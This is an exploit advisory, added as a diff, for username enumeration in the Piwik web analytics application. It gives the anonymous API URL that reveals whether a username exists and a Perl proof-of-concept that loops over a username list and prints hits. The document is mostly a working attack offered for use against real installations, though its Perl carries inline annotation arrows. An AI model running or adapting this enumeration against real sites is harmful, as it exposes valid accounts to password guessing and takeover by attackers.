@@ -1,0 +1,40 @@
+# Exploit Title: piwik username enumeration
+# Date: 03/11/2011
+# Author: Iolo Morganwg
+# Category: Web App
+# Version: PHP
+# Tested on: Windows XP SP3
+# Diolch i DM
+# Vendor: http://piwik.org/
+
+Installations of piwik can lead to username enumerated if the API is
+available.  A url of the following form can be supplied:
+
+http://www.HOST.HOST/piwik/index.php?module=API&method=UsersManager.userExists&userLogin=USERNAME&format=xml&token_auth=anonymous
+
+A negative USERNAME value producing: <result>0</result> and a positive
+USERNAME hit producing <result>1</result>
+
+POC Code:
+========
+
+#!/usr/bin/perl
+use strict;
+use warnings;
+use LWP::Simple;
+use XML::Simple;
+use Data::Dumper;
+
+foreach (`cat userlist`) {  <-- list of usernames
+
+getstore ("http://www.HOST/piwik/index.php?module=API&method=UsersManager.userExists&userLogin=$_&format=xml&token_auth=anonymous","/tmp/temp.xml")
+or die "Couldn't get url";  <-- url
+
+my $xml = XML::Simple->new();
+my $data = $xml->XMLin("/tmp/temp.xml");
+
+chomp;
+print "$_ - hit\n" if Dumper($data) =~ /1\'\;$/;
+
+system("rm -f /tmp/temp.xml"); # clean up!
+}
